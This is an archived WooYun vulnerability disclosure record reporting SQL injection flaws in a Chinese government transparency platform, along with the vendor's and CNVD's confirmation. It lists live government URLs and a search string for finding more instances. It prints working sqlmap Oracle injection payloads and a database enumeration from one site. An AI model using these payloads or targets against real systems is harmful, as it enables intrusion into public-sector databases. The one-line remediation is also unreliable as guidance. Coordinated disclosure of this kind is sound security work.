{"id": 54114, "wybug_id": "wooyun-2014-065502", "wybug_title": "某通用政府平台多处SQL注入漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2014-06-20 09:01", "wybug_open_date": "2014-09-18 09:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向公众公开  简要描述： 某通用政府平台多处SQL注入漏洞 详细说明：  官方：http://www.zdvictory.com/广州中大凯旋电子科技有限公司案例：http://www.zdvictory.com/a/chanpinzhongxin/chenggonganli/list_10_1.htmlGoogle关键字搜索：inurl:/website/dflz/\n\n实际案例：http://dflz.shanwei.gov.cn/website/dflz/dflzSiteAction.actionhttp://dflz.meizhou.gov.cn/website/dflz/dflzSiteAction.actionhttp://dflz.maoming.gov.cn/website/dflz/dflzSiteAction.actionhttp://www.cwgk.gz.gov.cn/website/dflz/dflzSiteAction.actionhttp://219.129.166.87/website/dflz/dflzSiteAction.actionhttp://dflz.zhaoqing.gov.cn/website/dflz/dflzCjAction.action?orgCode=4412230112&orgName=%D3%C0%C7%E0%B4%E5http://ygnl.szdflz.gov.cn/website/dflz/dflzXianjAction.action?orgCode=140601&orgName=%CB%B7%B3%C7%C7%F8http://dflz.sg.gov.cn/website/dflz/dflzCjAction.action?orgCode=4402040101&orgName=%B2%E8%C9%BD%BE%D3%C3%F1%C7%F8......还有未搜索出来的就不一一列举了。   漏洞证明：  拿http://dflz.shanwei.gov.cn/website/dflz/dflzSiteAction.action为例第一处SQL注入：财务公开——收支明细：http://dflz.shanwei.gov.cn/website/dflz/dflzCjAction!listMoreCjxx.action?orgCode=4415211520&issueTypeCode=C_CAIWUGK_001&orgName=%B8%DF%B1%B1%B4%E5参数orgCode存在SQL注入\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: orgCode    Type: error-based    Title: Oracle OR error-based - WHERE or HAVING clause (XMLType)    Payload: orgCode=-9147') OR 6633=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(98)||CHR(105)||CHR(113)||(SELECT (CASE WHEN (6633=6633) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(102)||CHR(105)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND ('oJEt'='oJEt&issueTypeCode=C_CAIWUGK_001&orgName=%B8%DF%B1%B1%B4%E5    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (comment)    Payload: orgCode=4415211520') AND 1821=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(109)||CHR(101)||CHR(113),5)--&issueTypeCode=C_CAIWUGK_001&orgName=%B8%DF%B1%B1%B4%E5---[16:15:29] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[16:15:29] [INFO] fetched data logged to text files under\n第二处SQL注入法例条例：http://dflz.shanwei.gov.cn/website/dflz/dflzSiteAction!sjList.action?orgCode=441500&issueTypeCode=S_002参数issueTypeCode存在SQL注入\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: issueTypeCode    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: orgCode=441500&issueTypeCode=S_002' AND 7880=7880 AND 'DkKC'='DkKC    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: orgCode=441500&issueTypeCode=S_002' AND 7364=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'cDNF'='cDNF---[16:16:29] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle\n第三处SQL注入咨询投诉——咨询主题\nsqlmap identified the following injection points with a total of 114 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=e167642aba804cf6b9e12124bf0de02b' AND 4888=4888 AND 'oKPh'='oKPh&xianOrgCode=    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: id=e167642aba804cf6b9e12124bf0de02b' AND 2110=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(97)||CHR(111)||CHR(103)||CHR(113)||(SELECT (CASE WHEN (2110=2110) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(112)||CHR(103)||CHR(113)||CHR(62))) FROM DUAL) AND 'mCyo'='mCyo&xianOrgCode=    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: id=e167642aba804cf6b9e12124bf0de02b' AND 6094=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(105)||CHR(116)||CHR(98),5) AND 'GUFw'='GUFw&xianOrgCode=---[16:19:46] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle\n估计还有其他注入，没有全部找出来，基础代表就行。\navailable databases [22]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] HR[*] IX[*] MDSYS[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] SCOTT[*] SH[*] SHANWEI[*] SHANWEI_TEST[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB\n   修复方案：  过滤下。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-06-25 08:26 厂商回复： CNVD确认并复现所述多个实例情况，根据测试实例，已经转由CNCERT下发给广东分中心，要求广东分中心后续同步协调软件生产厂商和网站用户政府单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}